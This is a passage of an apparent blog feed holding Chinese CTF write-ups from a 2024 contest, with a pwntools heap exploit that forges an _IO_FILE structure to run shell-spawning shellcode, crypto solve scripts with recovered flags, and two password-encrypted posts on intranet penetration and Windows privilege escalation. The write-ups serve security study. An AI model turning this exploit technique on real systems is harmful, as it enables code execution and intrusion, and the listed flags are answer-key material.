class="hljs-string">&#x27;choice&#x27;</span>,p32(<span class="hljs-number">1</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;index&#x27;</span>,p32(ind&amp;<span class="hljs-number">0xffffffff</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;long?&#x27;</span>,p32(size&amp;<span class="hljs-number">0xffffffff</span>))<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;choice&#x27;</span>,p32(<span class="hljs-number">3</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;index&#x27;</span>,p32(ind&amp;<span class="hljs-number">0xffffffff</span>))<br>    p.readuntil(<span class="hljs-string">&#x27;&gt;&gt;&gt;\n&#x27;</span>)<br>    <span class="hljs-keyword">return</span> p.readuntil(<span class="hljs-string">&#x27;1.&#x27;</span>,drop=<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">ind</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;choice&#x27;</span>,p32(<span class="hljs-number">2</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;index&#x27;</span>,p32(ind&amp;<span class="hljs-number">0xffffffff</span>))<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;choice&#x27;</span>,p32(<span class="hljs-number">4</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;index&#x27;</span>,p32(ind&amp;<span class="hljs-number">0xffffffff</span>))<br><br>    p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,data)<br>    <span class="hljs-keyword">pass</span><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>d=u64(show(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x21ace0</span><br>fake_io_add=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0xebc88</span><br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>obstack_jump=libc.address+<span class="hljs-number">0x2173c0</span><br>gs=fake_io_add+<span class="hljs-number">0xe0</span><br>shelladd=gs+<span class="hljs-number">0xe8</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>setcontext=libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>shellcode=shellcraft.sh()<br><br><br>obstack=fake_io_add<br>context=fake_io_add+<span class="hljs-number">0xe8</span><br>shelladd=context+<span class="hljs-number">0xe8</span><br>fake_io=flat(&#123;<br>    <span class="hljs-number">0x28</span>: shelladd,<br>    <span class="hljs-number">0x38</span>: setcontext,<br>    <span class="hljs-number">0x48</span>: [context,<span class="hljs-number">1</span>],<br><span class="hljs-number">0xd8</span>: obstack_jump+<span class="hljs-number">0x20</span>,<br>    <span class="hljs-number">0xe0</span>: fake_io_add,<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>cont=flat(&#123;<br><span class="hljs-number">0x68</span>: obstack&amp;(~<span class="hljs-number">0xfff</span>), <span class="hljs-comment"># rdi</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>, <span class="hljs-comment"># rsi</span><br><span class="hljs-number">0x88</span>: <span class="hljs-number">7</span>, <span class="hljs-comment"># rdx</span><br><span class="hljs-number">0xa0</span>: obstack+<span class="hljs-number">0x28</span>, <span class="hljs-comment"># rsp</span><br><span class="hljs-number">0xa8</span>: mprotect, <span class="hljs-comment"># rcx-&gt;rip</span><br><span class="hljs-number">0xe0</span>: obstack<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload=fake_io+cont+asm(shellcode)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>):<br>    add(i+<span class="hljs-number">2</span>,<span class="hljs-number">0x300</span>)<br>pause()<br>edit(-<span class="hljs-number">8</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ezRe"><a href="#ezRe" class="headerlink" title="ezRe"></a>ezRe</h2><p>魔改rc4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">rc4</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toBytes</span>(<span class="hljs-params">self,data</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">str</span>:<br>            <span class="hljs-keyword">return</span> data.encode()<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">return</span> data<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;data Type Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetKey</span>(<span class="hljs-params">self,data</span>):<br>        k=[<span class="hljs-number">132</span>, <span class="hljs-number">206</span>, <span class="hljs-number">173</span>, <span class="hljs-number">4</span>, <span class="hljs-number">211</span>, <span class="hljs-number">121</span>, <span class="hljs-number">250</span>, <span class="hljs-number">202</span>, <span class="hljs-number">41</span>, <span class="hljs-number">13</span>, <span class="hljs-number">59</span>, <span class="hljs-number">166</span>, <span class="hljs-number">91</span>, <span class="hljs-number">116</span>, <span class="hljs-number">34</span>, <span class="hljs-number">200</span>, <span class="hljs-number">248</span>, <span class="hljs-number">49</span>, <span class="hljs-number">102</span>, <span class="hljs-number">215</span>, <span class="hljs-number">63</span>, <span class="hljs-number">160</span>, <span class="hljs-number">21</span>, <span class="hljs-number">103</span>, <span class="hljs-number">135</span>, <span class="hljs-number">68</span>, <span class="hljs-number">208</span>, <span class="hljs-number">175</span>, <span class="hljs-number">36</span>, <span class="hljs-number">30</span>, <span class="hljs-number">146</span>, <span class="hljs-number">181</span>, <span class="hljs-number">38</span>, <span class="hljs-number">64</span>, <span class="hljs-number">194</span>, <span class="hljs-number">57</span>, <span class="hljs-number">165</span>, <span class="hljs-number">195</span>, <span class="hljs-number">79</span>, <span class="hljs-number">99</span>, <span class="hljs-number">141</span>, <span class="hljs-number">0</span>, <span class="hljs-number">145</span>, <span class="hljs-number">96</span>, <span class="hljs-number">189</span>, <span class="hljs-number">128</span>, <span class="hljs-number">5</span>, <span class="hljs-number">170</span>, <span class="hljs-number">90</span>, <span class="hljs-number">55</span>, <span class="hljs-number">148</span>, <span class="hljs-number">229</span>, <span class="hljs-number">73</span>, <span class="hljs-number">219</span>, <span class="hljs-number">104</span>, <span class="hljs-number">243</span>, <span class="hljs-number">15</span>, <span class="hljs-number">77</span>, <span class="hljs-number">123</span>, <span class="hljs-number">152</span>, <span class="hljs-number">111</span>, <span class="hljs-number">239</span>, <span class="hljs-number">2</span>, <span class="hljs-number">35</span>, <span class="hljs-number">93</span>, <span class="hljs-number">190</span>, <span class="hljs-number">9</span>, <span class="hljs-number">26</span>, <span class="hljs-number">105</span>, <span class="hljs-number">199</span>, <span class="hljs-number">167</span>, <span class="hljs-number">228</span>, <span class="hljs-number">84</span>, <span class="hljs-number">124</span>, <span class="hljs-number">143</span>, <span class="hljs-number">252</span>, <span class="hljs-number">232</span>, <span class="hljs-number">66</span>, <span class="hljs-number">130</span>, <span class="hljs-number">122</span>, <span class="hljs-number">8</span>, <span class="hljs-number">71</span>, <span class="hljs-number">28</span>, <span class="hljs-number">53</span>, <span class="hljs-number">172</span>, <span class="hljs-number">251</span>, <span class="hljs-number">203</span>, <span class="hljs-number">89</span>, <span class="hljs-number">209</span>, <span class="hljs-number">23</span>, <span class="hljs-number">147</span>, <span class="hljs-number">101</span>, <span class="hljs-number">127</span>, <span class="hljs-number">86</span>, <span class="hljs-number">137</span>, <span class="hljs-number">236</span>, <span class="hljs-number">184</span>, <span class="hljs-number">1</span>, <span class="hljs-number">185</span>, <span class="hljs-number">134</span>, <span class="hljs-number">24</span>, <span class="hljs-number">16</span>, <span class="hljs-number">50</span>, <span class="hljs-number">32</span>, <span class="hljs-number">100</span>, <span class="hljs-number">76</span>, <span class="hljs-number">230</span>, <span class="hljs-number">88</span>, <span class="hljs-number">19</span>, <span class="hljs-number">225</span>, <span class="hljs-number">168</span>, <span class="hljs-number">87</span>, <span class="hljs-number">43</span>, <span class="hljs-number">94</span>, <span class="hljs-number">207</span>, <span class="hljs-number">46</span>, <span class="hljs-number">22</span>, <span class="hljs-number">214</span>, <span class="hljs-number">136</span>, <span class="hljs-number">54</span>, <span class="hljs-number">164</span>, <span class="hljs-number">106</span>, <span class="hljs-number">133</span>, <span class="hljs-number">10</span>, <span class="hljs-number">198</span>, <span class="hljs-number">60</span>, <span class="hljs-number">98</span>, <span class="hljs-number">142</span>, <span class="hljs-number">110</span>, <span class="hljs-number">192</span>, <span class="hljs-number">220</span>, <span class="hljs-number">201</span>, <span class="hljs-number">222</span>, <span class="hljs-number">140</span>, <span class="hljs-number">82</span>, <span class="hljs-number">95</span>, <span class="hljs-number">51</span>, <span class="hljs-number">154</span>, <span class="hljs-number">62</span>, <span class="hljs-number">118</span>, <span class="hljs-number">221</span>, <span class="hljs-number">11</span>, <span class="hljs-number">125</span>, <span class="hljs-number">233</span>, <span class="hljs-number">108</span>, <span class="hljs-number">52</span>, <span class="hljs-number">17</span>, <span class="hljs-number">234</span>, <span class="hljs-number">254</span>, <span class="hljs-number">14</span>, <span class="hljs-number">18</span>, <span class="hljs-number">255</span>, <span class="hljs-number">120</span>, <span class="hljs-number">29</span>, <span class="hljs-number">155</span>, <span class="hljs-number">126</span>, <span class="hljs-number">153</span>, <span class="hljs-number">40</span>, <span class="hljs-number">176</span>, <span class="hljs-number">12</span>, <span class="hljs-number">177</span>, <span class="hljs-number">245</span>, <span class="hljs-number">171</span>, <span class="hljs-number">83</span>, <span class="hljs-number">156</span>, <span class="hljs-number">187</span>, <span class="hljs-number">191</span>, <span class="hljs-number">112</span>, <span class="hljs-number">80</span>, <span class="hljs-number">235</span>, <span class="hljs-number">244</span>, <span class="hljs-number">237</span>, <span class="hljs-number">109</span>, <span class="hljs-number">78</span>, <span class="hljs-number">249</span>, <span class="hljs-number">231</span>, <span class="hljs-number">149</span>, <span class="hljs-number">72</span>, <span class="hljs-number">216</span>, <span class="hljs-number">107</span>, <span class="hljs-number">241</span>, <span class="hljs-number">69</span>, <span class="hljs-number">174</span>, <span class="hljs-number">253</span>, <span class="hljs-number">27</span>, <span class="hljs-number">144</span>, <span class="hljs-number">182</span>, <span class="hljs-number">180</span>, <span class="hljs-number">150</span>, <span class="hljs-number">61</span>, <span class="hljs-number">162</span>, <span class="hljs-number">56</span>, <span class="hljs-number">163</span>, <span class="hljs-number">186</span>, <span class="hljs-number">37</span>, <span class="hljs-number">131</span>, <span class="hljs-number">65</span>, <span class="hljs-number">223</span>, <span class="hljs-number">39</span>, <span class="hljs-number">115</span>, <span class="hljs-number">138</span>, <span class="hljs-number">33</span>, <span class="hljs-number">218</span>, <span class="hljs-number">42</span>, <span class="hljs-number">157</span>, <span class="hljs-number">3</span>, <span class="hljs-number">97</span>, <span class="hljs-number">246</span>, <span class="hljs-number">210</span>, <span class="hljs-number">178</span>, <span class="hljs-number">158</span>, <span class="hljs-number">92</span>, <span class="hljs-number">240</span>, <span class="hljs-number">117</span>, <span class="hljs-number">47</span>, <span class="hljs-number">217</span>, <span class="hljs-number">205</span>, <span class="hljs-number">196</span>, <span class="hljs-number">70</span>, <span class="hljs-number">159</span>, <span class="hljs-number">129</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">227</span>, <span class="hljs-number">6</span>, <span class="hljs-number">213</span>, <span class="hljs-number">74</span>, <span class="hljs-number">113</span>, <span class="hljs-number">151</span>, <span class="hljs-number">7</span>, <span class="hljs-number">67</span>, <span class="hljs-number">20</span>, <span class="hljs-number">45</span>, <span class="hljs-number">75</span>, <span class="hljs-number">139</span>, <span class="hljs-number">204</span>, <span class="hljs-number">44</span>, <span class="hljs-number">161</span>, <span class="hljs-number">226</span>, <span class="hljs-number">179</span>, <span class="hljs-number">119</span>, <span class="hljs-number">188</span>, <span class="hljs-number">247</span>, <span class="hljs-number">25</span>, <span class="hljs-number">31</span>, <span class="hljs-number">48</span>, <span class="hljs-number">242</span>, <span class="hljs-number">183</span>, <span class="hljs-number">197</span>, <span class="hljs-number">238</span>, <span class="hljs-number">193</span>, <span class="hljs-number">85</span>, <span class="hljs-number">114</span>, <span class="hljs-number">169</span>, <span class="hljs-number">224</span>, <span class="hljs-number">212</span>]<br>        <span class="hljs-keyword">return</span> k<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Cipher</span>(<span class="hljs-params">self,data</span>):<br>        data=self.toBytes(data)<br>        enc=[]<br>        k=self.Key.copy()<br>        n=<span class="hljs-number">0</span><br>        n1=<span class="hljs-number">0</span><br>        tmp=<span class="hljs-number">0</span><br>        key=[]<br>        <span class="hljs-built_in">print</span>(k)<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>            n=(n+<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xff</span><br>            n1=(n1+k[n])&amp;<span class="hljs-number">0xff</span><br>            tmp=k[n]<br>            k[n]=k[n1]<br>            k[n1]=tmp<br>            key.append(k[(k[n]+k[n1])%<span class="hljs-number">256</span>])<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-keyword">for</span> c,k <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(data,key):<br>            enc.append(c^k^<span class="hljs-number">51</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,key</span>):<br>        key=self.toBytes(key)<br>        self.Key=self.GetKey(key)<br>        self.__Key=key<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SetKey</span>(<span class="hljs-params">self,key</span>):<br>        key=self.toBytes(key)<br>        self.Key=self.GetKey(key)<br>        self.__Key=key<br><br><span class="hljs-keyword">import</span> base64<br>b=base64.b64decode(<span class="hljs-string">&quot;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>b_=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    b_.append(<span class="hljs-built_in">ord</span>(i))<br>key=<span class="hljs-string">b&quot;7e021a7dd49e4bd0837e22129682551b&quot;</span><br>key_=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key:<br>    key_.append(i^<span class="hljs-number">102</span>)<br>r=rc4(<span class="hljs-built_in">bytes</span>(key_))<br><span class="hljs-built_in">print</span>(r.Cipher(<span class="hljs-built_in">bytes</span>(b_)))<br></code></pre></td></tr></table></figure><h1 id="信创安全"><a href="#信创安全" class="headerlink" title="信创安全"></a>信创安全</h1><h2 id="sm4rev"><a href="#sm4rev" class="headerlink" title="sm4rev"></a>sm4rev</h2><p>将文件在linux中运行一遍</p><p>发现在<code>/tmp</code>目录下生成了一个随机文件<code>xxx</code>开头的文件夹，里面存放了一个二进制程序</p><p>使用<code>find-crypto</code>插件发现是<code>sm4</code>加密，且是<code>ECB</code>模式</p><p>注意端序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">v17 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>))<br>v17[<span class="hljs-number">0</span>] = <span class="hljs-number">0x01DE4BF77DAD5D82</span>;<br>v17[<span class="hljs-number">1</span>] = <span class="hljs-number">0x4F456C06436A9EDC</span>;<br>v17[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6584914E6D690D85</span>;<br>v17[<span class="hljs-number">3</span>] = <span class="hljs-number">0x2DABC532B0D82242</span>;<br>v17[<span class="hljs-number">4</span>] = <span class="hljs-number">0x3E205B8369A8D383</span>;<br>v17[<span class="hljs-number">5</span>] = <span class="hljs-number">0xBF353724125EBC3A</span>;<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v17:<br>    <span class="hljs-built_in">print</span>(i.to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>).<span class="hljs-built_in">hex</span>(),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>密文: <code>825dad7df74bde01dc9e6a43066c454f850d696d4e9184654222d8b032c5ab2d83d3a869835b203e3abc5e12243735bf</code></p><p>密钥: <code>0123456789abcdeffedcba9876543210</code></p><p><code>DASCTF&#123;SM4_is_secure_but_d0nt_t3ll_any0ne!&#125;</code></p><h1 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h1><h2 id="ds-enen"><a href="#ds-enen" class="headerlink" title="ds-enen"></a>ds-enen</h2><p>附加data.vhd没有内容</p><p>foremost分离出一个zip</p><p>数字暴力破解得到密码<code>60111106</code></p><p>打开是一个csv表格，个性签名被加密了，看组成猜测是aes，用密码做为key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> base64<br><br>data = pd.read_csv(<span class="hljs-string">&#x27;data.csv&#x27;</span>)<br>password = data[<span class="hljs-string">&#x27;密码&#x27;</span>]<br>signature = data[<span class="hljs-string">&#x27;个性签名(加密版)&#x27;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    key = key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(key)) * <span class="hljs-string">b&#x27;\0&#x27;</span><br>    ciphertext = base64.b64decode(ciphertext)<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    plaintext = cipher.decrypt(ciphertext)<br>    <span class="hljs-keyword">return</span> plaintext<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(password)):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;DASCTF&#x27;</span> <span class="hljs-keyword">in</span> aes_decrypt(signature[i], password[i]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(aes_decrypt(signature[i], password[i]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p><code>DASCTF&#123;dcd85182008e3a2d51b37f9845df3312&#125;</code></p><h2 id="ds-encode"><a href="#ds-encode" class="headerlink" title="ds-encode"></a>ds-encode</h2><p>与 <a href="http://localhost:4000/posts/da856207/#%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8">2024年“羊城杯”粤港澳大湾区网络安全大赛</a> 初赛的数据安全基本一样</p><p>区别是数据源给的不一样，这次是mysql数据库的文件</p><p>将题目给的文件全部复制到mysql中的data文件中即可，注意数据库版本需要是5.7(ib_logfile中可以看到)</p><p><img src="/img/wp/2024/2024-zjss-cs-ds-encode-1.png"></p><p>剩下的就很简单了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;h2 id=&quot;网安知识大挑战&quot;&gt;&lt;a href=&quot;#网安知识大挑战&quot; class=&quot;headerlink&quot; title=&quot;网安知识大挑战&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2024" scheme="https://www.dr0n.top/tags/2024/"/>
    
    <category term="浙江" scheme="https://www.dr0n.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透学习(二)</title>
    <link href="https://www.dr0n.top/posts/8411a35f/"/>
    <id>https://www.dr0n.top/posts/8411a35f/</id>
    <published>2024-10-12T04:00:00.000Z</published>
    <updated>2024-10-12T09:05:25.087Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cd5c7b0f4ea515af24ca38a4c543e97856976667da1eaca205764fc64ba95066">d53f41d2c7ee3b58c8999934d306edce22c71ecac700bd8e6517dad81c6abf70e2a53ae8d3fc6939e6f2043469774277288dfb2db5c37415c91ecf448ba3c1a2a63a3b84403448610df465cdadb86695636da08d6bcf0034d53e9eba0a3b4b45ef7b7c480cd3ef9bb63f7c09e13e9487b79031351fcfe6ba91f304e421217f4fa048ffe48d9e2151419c8bca7ba7dbdfa822879099078234d370821bb7865f4da103b1fb327bd2bba0b7eb617e7ac1088f2471e5988460f76f7cbbe6907a969e3bc63966bee895b207d1060c1861557de14760cd090cfbfdf9a5e48e175720a48840b5ebe77030e41514e1c931b990b50e50ab0d51651992db7e412289f9a7283e807e87ed64f4f502e4aec0b0fabed10826122a62d67e2b4f93dc0fe3ca0568e11bdb924bf9929fa32fe6a5d32326e2d962d36886e59246dd9cb8245ea72364c17e7d47b0fb04d406e282033ef45e9870f4cb4b2b0d248df121da4953b268bc9847644234293e46f5eedd16bb3cdfcce309fb8f9df4fd014558714f42f6524e86d39694c65283b1cc5c1da5efa530c3d4a4ad3c9fcb669e94c3513f4631d5eff0f253e2550d954de0a17fe911f5226736306c2ced100da7b64acb08c4e8ed0db1908c89de14d52f8e999d352c578c8eb2481fc1a7362aaf39152c0ec7b8b8206095e34ce7d1413b95fe32998f5fb4a5bae914b425a3ab645c192477aad4b0fca25cbb6323f9d5e30bde4ef34e2bb0ae5f78c7dc88c60b13a6720a557cc1a0817deb7c02fc71c2c9923dc935177de8751a6d2e82bfdc08e50f0e05790edbd78785f1ad46d2f6ba9f5f000fb2d86db6a6bdebb9b5b043a34f4ee527217fca3855099f0fefa64337ebc17e52e39e9ead225223021bacd24dbd68ffe63b3cd4931d959b6a3431b8e3eb6bded6e67dd7237a13373f469d4b4d979237743afa55ecc1ab5217f0c4109c12c82a886c0c5cb343403271fa93d3b1e7062cac90aad33cb55a221a019a1998d72ece82efffc195f131d3d64dbfbeb62dfe12e20fc47c5de27d445c7a1196d5d5bfc541bf13695151c554276623190b4158c24aefe0cbc4104963a1bfce9a1d738ec57ffb374c45cf801bcc9b1f36f4d3d67acab2236d8a904e4b7295323ef114869faec203e9f8760166d3b3bf9882db41d1eb10e5c3e8c2775eef86aafad9e1e76e7622616b7f64b9e3f1e1af455a7d9934d80df195550b3d3e2f39d30d21cff5a785e26431fad15b91f5a46df46b927083f65f95afd5993abe8979e5bdbb7df88dd84a9c87e3b963e2fb4adad9eab434b3636672271bd6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="内网" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="域" scheme="https://www.dr0n.top/tags/%E5%9F%9F/"/>
    
    <category term="横向移动" scheme="https://www.dr0n.top/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>windows提权笔记</title>
    <link href="https://www.dr0n.top/posts/a04618bd/"/>
    <id>https://www.dr0n.top/posts/a04618bd/</id>
    <published>2024-10-11T04:00:00.000Z</published>
    <updated>2024-10-12T13:24:52.245Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e690cadd2ce73ceee29e95927a64df480e8c028d8504ebb9201c0efa0c17fd31">d53f41d2c7ee3b58c8999934d306edce22c71ecac700bd8e6517dad81c6abf7004a5f045b9e04b440c9cc8bb2ccc6c06104271ce939348ace633475ee77327ff47d368a6da817cd522beab6bc8b6eaa61ccfeb128b10667cb74428aba9db02629552d90ca25e8d0937f9c1d8c83773e7b00866483d6a72bc9ee897af26406cb28908619e142bc43ebb6b69c5f674f9d5aa646e92955b848e257d30e9b152a239335b9783df2f4c03c5b11b88c02f24ce3bdfe2ce143b543d5f6e188ce154ceee4d9a42915129274fc9130d84000ac6d875cc96ee166ba8ef88f1bb964891db62ea5f1b0139b7bc19e14a57a396bb720c9f17bd5983aa66e68959b0f04850dd7350a89cbb7c27777aa0ca3198fdd158f76ff9b0eae0203da8ccab7f1b4b3e94fcdbb5e338111480f515c143ea13f62fd23142a544098d6a2747472a80c1a9e202376c3def08c6c4ec645314f3e3f1b0aa6b255216c7db31594eab3cf404777b3e0c5fb1661b5ab7a6f96cf184e94c31b3370774cbb3c137bbaa2d006d54cd42b0b7e19624e5fe791f1584de10413c4fccc31e2bd386e8b1a125736f4681ee98a6aa06f24ce8cce752661ed60b5a8b3499edd35f2f4494ac3995d9241994a3c2aebe228607f29847ba16ee0df89a1b49a157e3c2159ff5cf6b76c22786d72a24d0edb52e8873b333c9c6200c0ad1595d69e0327f1b12f011164a076a88ab43e3af404c15ef7923f984bc395ff9193d61a8b7555a3891b02c7faec30306a324ad76e7441263d7a34c282f5eaf1f412d01e4465380d75fdbb1c8752ee7e2e193c522a32544cdc47076794153b7698c61817ea384971d595f7b005b851edf978bf2f425407765452166908c43747856ec8973f0d0b363953403db7440d323d652cc292a3aee4ac3559b97e4c0ccbb1ffcd512dc6dead29118efde60f12b6d3ed507746b7c4ffa397ae12900b3d9386ef29397fef1b6039dde67373718d93d74c699c5c7883aa836debecdc6552668